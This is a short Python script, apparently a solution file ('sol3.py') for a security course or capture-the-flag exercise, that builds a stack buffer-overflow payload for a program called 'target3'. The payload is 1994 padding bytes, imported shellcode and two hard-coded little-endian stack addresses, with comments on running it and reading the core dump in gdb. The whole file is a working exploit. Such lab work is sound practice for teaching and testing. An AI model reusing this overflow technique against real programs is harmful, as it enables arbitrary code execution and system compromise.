#!/usr/bin/env python3
#run <(python3 sol3.py)

#./target3 <(python3 sol3.py)
# gdb ./target3 core
import sys

from shellcode import shellcode


sys.stdout.buffer.write(b'A'*(1994))
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(0x7ffffff685a8.to_bytes(8,'little'))
sys.stdout.buffer.write(0x7ffffff68598.to_bytes(8,'little'))
